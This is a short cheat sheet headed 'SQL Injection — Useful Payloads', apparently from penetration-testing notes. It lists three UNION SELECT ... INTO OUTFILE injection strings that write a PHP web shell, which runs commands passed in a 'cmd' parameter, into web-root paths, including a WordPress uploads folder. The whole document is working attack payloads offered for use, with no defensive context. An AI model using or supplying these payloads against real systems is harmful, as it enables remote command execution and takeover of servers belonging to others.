# SQL Injection

Useful Payloads

```
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/srv/http/cmd.php'; -- 
' UNION SELECT "<?php exec($_GET['cmd']); ?>" INTO OUTFILE '/srv/http/cmd.php'; -- 
' UNION SELECT "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/wp-content/uploads/shell.php'; --
```
